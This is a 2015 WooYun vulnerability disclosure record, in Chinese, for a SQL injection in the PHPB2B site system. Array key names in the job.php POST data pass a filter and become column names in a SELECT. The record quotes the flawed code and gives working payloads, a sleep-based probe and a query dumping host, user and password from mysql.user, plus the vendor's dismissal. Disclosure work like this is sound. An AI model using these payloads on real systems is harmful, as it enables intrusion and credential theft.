{"id": 38382, "wybug_id": "wooyun-2015-096444", "wybug_title": "PHPB2B网站管理系统SQL注入漏洞(无视防注入)", "wybug_corp": "phpb2b.com", "wybug_author": "error", "wybug_date": "2015-02-16 13:22", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： RT 详细说明：  \n注入链接：/virtual-office/job.php注入参数：job漏洞代码：（第52行开始）if (!empty($_POST['job']) && $_POST['save']) {\t$vals = $_POST['job'];\tpb_submit_check('job');   // 验证post提交的token,可直接使用get访问job.php后在网页源码中搜索formhash获取\t$now_job_amount = $job->findCount(null, \"created>\".$today_start.\" AND member_id=\".$the_memberid);\tif (isset($_POST['id'])) {\t\t$id = $_POST['id'];\t}\tif(!empty($_POST['expire_time'])) {\t\t$vals['expire_time'] = Times::dateConvert($_POST['expire_time']);\t}\t$check_job_update = $g['job_check'];\tif ($check_job_update==\"0\") {\t\t$vals['status'] = 1;        $message_info = 'msg_wait_success';\t}else {\t\t$vals['status'] = 0;\t\t$message_info = 'msg_wait_check';\t}    $vals['industry_id'] = PbController::getMultiId($_POST['industry']['id']);    $vals['area_id'] = PbController::getMultiId($_POST['area']['id']);\tif(!empty($id)){\t\t$vals['modified'] = $time_stamp;\t\tunset($vals['created']);\t\t$result = $job->save($vals, \"update\", $id, null, \"member_id=\".$the_memberid);$vals = $_POST['job'];从post中获取job数组参数，并将$vals数组传入save函数，save函数中通过以下以下代码构造SQL语句：(libraries/core/model.php)$keys = array_keys($posts);$cols = implode($keys,\",\");$tbname = (is_null($tbname))? $this->getTable():trim($tbname);$this->table_name = $tbname;if(!empty($id)){\t$sql = \"SELECT $cols FROM \".$tbname.\" WHERE \".$this->primaryKey.\"='\".$id.\"'\";在save函数中$vals数组的键名会被拆分为select语句的列名列表$cols,由于$vals可控导致sql注入，且是数组键名，因此可绕过代码中的注入检测\n   漏洞证明：  \n漏洞测试：首先直接访问：http://127.0.0.1/phpb2b/virtual-office/job.php查看网页源代码获取页面token<input type=\"hidden\" name=\"formhash\" value=\"8ab96122454d5f50\" id=\"FormHash\">\n\n获取token后就可以进行SQL注入http://127.0.0.1/phpb2b/virtual-office/job.phpPost:job[if((length(user())>61),1,sleep(5))%23]=1&save=1&id=1&formhash=8ab96122454d5f50为了方便调试，在代码里把执行的SQL语句打印出来\n\n\n\nMysql日志：\n\n\n\n成功执行延时注入可无视SQL注入检测，执行SQL语句http://127.0.0.1/phpb2b/virtual-office/job.phpPost:job[host,user,password/**/from/**/mysql.user/**/where/**/1>0/**/limit/**/0,1%23]=1&save=1&id=1&formhash=8ab96122454d5f50\n\n\n\nMysql日志：\n\n\n\n\n   修复方案：  inject checking  on column_name    版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}